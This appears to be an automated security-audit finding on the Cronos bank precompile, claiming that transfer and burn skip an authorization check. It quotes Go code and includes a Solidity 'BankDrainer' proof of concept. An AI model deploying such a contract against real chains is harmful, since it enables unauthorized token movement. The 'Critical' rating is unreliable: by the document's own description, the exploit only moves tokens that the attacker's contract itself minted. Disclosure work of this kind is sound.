### Title
Bank Precompile `transfer` Accepts Arbitrary `sender` Without Authorization Check — (`x/cronos/keeper/precompiles/bank.go`)

### Summary
The Cronos bank precompile's `transfer` (and `burn`) method accepts an arbitrary `sender` address from calldata and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that the calling contract has been authorized by `from`. Any contract can drain `evm/<contract>` native tokens from any holder without their consent — the exact structural analog to VADER's `transferTo`/`tx.origin` approval-skip.

### Finding Description

The bank precompile at `x/cronos/keeper/precompiles/bank.go` exposes a `transfer(address sender, address recipient, uint256 amount)` method. The denom is derived from `contract.Caller()` (the calling contract's address), but the `from` account is taken directly from the ABI-decoded calldata argument `sender`:

```go
case TransferMethodName:
    sender := args[0].(common.Address)
    recipient := args[1].(common.Address)
    from := sdk.AccAddress(sender.Bytes())
    to := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())   // "evm/<calling_contract>"
    // ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no check that `sender == contract.Caller()` or that `from` has granted any allowance to the calling contract. The same pattern applies to `burn`, where `recipient` (the address to burn from) is taken from calldata with no authorization check:

```go
case MintMethodName, BurnMethodName:
    recipient := args[0].(common.Address)
    addr := sdk.AccAddress(recipient.Bytes())
    // ...
    bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
``` [1](#0-0) [2](#0-1) 

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled assets.**

Any unprivileged actor who deploys a contract can call `bank.transfer(victim, attacker, amount)` to move `evm/<contract>` native bank-module tokens from any holder to any destination, with no approval from the victim. Similarly, `bank.burn(victim, amount)` destroys a victim's balance. The victim's only "protection" is not holding tokens of that specific denom — but the attacker controls minting of that denom and can airdrop tokens to targets first.

This matches the allowed Critical impact: *"Unauthorized transfer … for … precompile-controlled assets."*

### Likelihood Explanation

The attack requires:
1. Deploying a contract (unprivileged, permissionless on Cronos EVM).
2. Minting `evm/<contract>` tokens to victims via `bank.mint(victim, amount)` — also callable by the same contract with no restriction.
3. Calling `bank.transfer(victim, attacker, balance)` at any time, with no victim interaction required.

No leaked keys, governance access, or cryptographic break is needed. The entry path is fully reachable by any unprivileged EVM transaction.

### Recommendation

In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

Similarly, in the `BurnMethodName` case, enforce that the address being burned from equals `contract.Caller()`. If third-party transfers are intentionally supported, introduce an EVM-level allowance mapping (analogous to ERC20 `approve`/`transferFrom`) before permitting arbitrary `from` addresses.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract BankDrainer {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: airdrop evm/<this> tokens to victim
    function airdrop(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this> tokens — no victim interaction needed
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `BankDrainer` at address `A`.
2. Calls `airdrop(victim, 1000)` — victim now holds 1000 `evm/A` native tokens.
3. Calls `drain(victim, attacker, 1000)` — victim's balance is transferred to attacker with no approval.

The bank precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, [{denom:"evm/A", amount:1000}])` unconditionally. [3](#0-2) [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
